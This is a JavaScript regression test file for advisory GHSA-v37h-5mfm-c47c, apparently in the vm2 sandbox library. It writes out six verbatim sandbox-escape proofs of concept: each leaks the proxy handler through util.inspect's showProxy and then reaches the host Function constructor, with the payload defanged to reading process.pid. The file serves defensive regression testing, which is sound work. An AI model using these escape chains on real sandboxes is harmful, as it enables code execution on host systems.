'use strict';

/**
 * GHSA-v37h-5mfm-c47c — handler-leak harvest history coverage (PoCs #1–6)
 *
 * The advisory thread documents 8 escape attempts iterating through
 * bypasses against the `util.inspect(showProxy:true)` handler leak.
 * PoC #7 (`p.getPrototypeOf(p)` + `new pp.constructor(s).set(...)`)
 * is the canonical handler-class-reconstruction case, closed by THIS branch's
 * fix and covered by `repro.js` + `invariant.js`.
 *
 * PoCs #1-6 are earlier variants that exercised different primitives once
 * the handler was leaked into `this.seen[1]`:
 *
 *   #1 — `objectWrapper()` write-back into wrapped sandbox object
 *   #2 — `fromOtherWithContext({...}).x`
 *   #3 — `doPreventExtensions(f, o)` to forge property writes
 *   #4 — `getFactory()(...)` to construct via leaked factory
 *   #5 — direct trap call: `seen[1].get(obj.slice, 'constructor')`
 *   #6 — reduce-bind chain leveraging `f.get` and host arrays
 *
 * They are CLOSED by intermediate fixes that have already landed on public
 * `main` (sequential f1d9cf4 / 57971fa / a6cd917 / 9084cd6).
 * This file ensures those defenses do not regress.
 *
 * Each test exercises the verbatim PoC from the advisory with host-side
 * `hostMark` for ground truth. RCE payload replaced with `process.pid`
 * extraction.
 *
 * NODE VERSION GATE: the leak harvest path uses `Buffer.prototype.slice`
 * being routed through `Buffer.prototype.inspect` to expose the proxy
 * handler. Node 24+ tightened argument validation on these methods so the
 * harvest never fires regardless of the fix. Tests are gated to Node ≤ 22;
 * on newer Nodes they skip with a status note. Verified failure-without-fix
 * on Node 18.20.7: all 6 PoCs escape on a pre-iteration baseline (96acb88).
 */

const assert = require('assert');
const { VM } = require('../../../lib/main.js');

const NODE_VERSION = parseInt(process.versions.node.split('.')[0], 10);
const HARVEST_REACHABLE = NODE_VERSION <= 22;

function condit(name, fn) {
	if (HARVEST_REACHABLE) {
		it(name, fn);
	} else {
		it.skip(name + ' [skipped: Node ' + NODE_VERSION + ' blocks the harvest at Buffer.prototype.inspect]', fn);
	}
}

describe('GHSA-v37h-5mfm-c47c — leak harvest history (PoCs #1–6)', function () {

	condit('PoC #1 (objectWrapper write-back): host process.pid not extractable', function () {
		const hostMark = {pid: null, err: null};
		const vm = new VM({sandbox: {hostMark}});
		vm.run(`
			const obj = {
				subarray: Buffer.prototype.inspect,
				slice: Buffer.prototype.slice,
				hexSlice: () => '',
				l: {__proto__: null}
			};
			obj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(a) {
				if (this.seen?.[1]?.objectWrapper) this.seen[1].objectWrapper().x = obj.slice;
				return a;
			}});
			try {
				hostMark.pid = obj.l.x.constructor('return process.pid')();
			} catch (e) { hostMark.err = e.message; }
		`);
		assert.strictEqual(hostMark.pid, null,
			'host process.pid was extracted: hostMark.pid=' + hostMark.pid + ', host pid=' + process.pid);
	});

	condit('PoC #2 (fromOtherWithContext): host process.pid not extractable', function () {
		const hostMark = {pid: null, err: null};
		const vm = new VM({sandbox: {hostMark}});
		vm.run(`
			const obj = {
				subarray: Buffer.prototype.inspect,
				slice: Buffer.prototype.slice,
				hexSlice: () => ''
			};
			let f;
			obj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(a) {
				if (this.seen?.[1]?.fromOtherWithContext) f = this.seen[1].fromOtherWithContext({__proto__: null, x: obj.slice}).x;
				return a;
			}});
			try {
				hostMark.pid = f.constructor('return process.pid')();
			} catch (e) { hostMark.err = e.message; }
		`);
		assert.strictEqual(hostMark.pid, null,
			'host process.pid was extracted: hostMark.pid=' + hostMark.pid + ', host pid=' + process.pid);
	});

	condit('PoC #3 (doPreventExtensions): host process.pid not extractable', function () {
		const hostMark = {pid: null, err: null};
		const vm = new VM({sandbox: {hostMark}});
		vm.run(`
			const obj = {
				subarray: Buffer.prototype.inspect,
				slice: Buffer.prototype.slice,
				hexSlice: () => ''
			};
			const x = {__proto__: null, x: obj.slice};
			let f;
			obj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(a) {
				if (this.seen?.[1]?.doPreventExtensions) {
					f = {};
					const o = {__proto__: null};
					Object.defineProperty(o, 'x', {value: x});
					this.seen[1].doPreventExtensions(f, o);
				}
				return a;
			}});
			try {
				hostMark.pid = f.x.x.constructor('return process.pid')();
			} catch (e) { hostMark.err = e.message; }
		`);
		assert.strictEqual(hostMark.pid, null,
			'host process.pid was extracted: hostMark.pid=' + hostMark.pid + ', host pid=' + process.pid);
	});

	condit('PoC #4 (getFactory): host process.pid not extractable', function () {
		const hostMark = {pid: null, err: null};
		const vm = new VM({sandbox: {hostMark}});
		vm.run(`
			const obj = {
				subarray: Buffer.prototype.inspect,
				slice: Buffer.prototype.slice,
				hexSlice: () => ''
			};
			let f;
			obj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(a) {
				if (this.seen?.[1]?.getFactory) {
					f = this.seen[1].getFactory()(() => ({__proto__: null, x: obj.slice})).apply(null, null, []);
				}
				return a;
			}});
			try {
				hostMark.pid = f.x.constructor('return process.pid')();
			} catch (e) { hostMark.err = e.message; }
		`);
		assert.strictEqual(hostMark.pid, null,
			'host process.pid was extracted: hostMark.pid=' + hostMark.pid + ', host pid=' + process.pid);
	});

	condit('PoC #5 (direct .get): host process.pid not extractable', function () {
		const hostMark = {pid: null, err: null};
		const vm = new VM({sandbox: {hostMark}});
		vm.run(`
			const obj = {
				subarray: Buffer.prototype.inspect,
				slice: Buffer.prototype.slice,
				hexSlice: () => ''
			};
			let f;
			obj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(a) {
				if (this.seen?.[1]?.get) f = this.seen[1].get(obj.slice, 'constructor');
				return a;
			}});
			try {
				hostMark.pid = f('return process.pid')();
			} catch (e) { hostMark.err = e.message; }
		`);
		assert.strictEqual(hostMark.pid, null,
			'host process.pid was extracted: hostMark.pid=' + hostMark.pid + ', host pid=' + process.pid);
	});

	condit('PoC #6 (reduce/bind chain): host process.pid not extractable', function () {
		const hostMark = {pid: null, err: null};
		const vm = new VM({sandbox: {hostMark}});
		vm.run(`
			const g = ({}).__lookupGetter__;
			const a = Buffer.apply;
			const p = a.apply(g, [Buffer, ['__proto__']]);
			const op = p.call(p.call(p.call(p.call(Buffer.of()))));
			const ho = op.constructor;
			const obj = {
				subarray: Buffer.prototype.inspect,
				slice: Buffer.prototype.slice,
				hexSlice: () => ''
			};
			let f;
			obj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(aa) {
				if (this.seen?.[1]?.get) f = this.seen[1];
				return aa;
			}});
			try {
				const b = ho.entries({});
				b[0] = [f, [obj.slice, 'constructor']];
				b[1] = [undefined, ['return process.pid']];
				hostMark.pid = b.reduce(a.apply(a.bind, [a, [a]]), f.get)();
			} catch (e) { hostMark.err = e.message; }
		`);
		assert.strictEqual(hostMark.pid, null,
			'host process.pid was extracted: hostMark.pid=' + hostMark.pid + ', host pid=' + process.pid);
	});
});
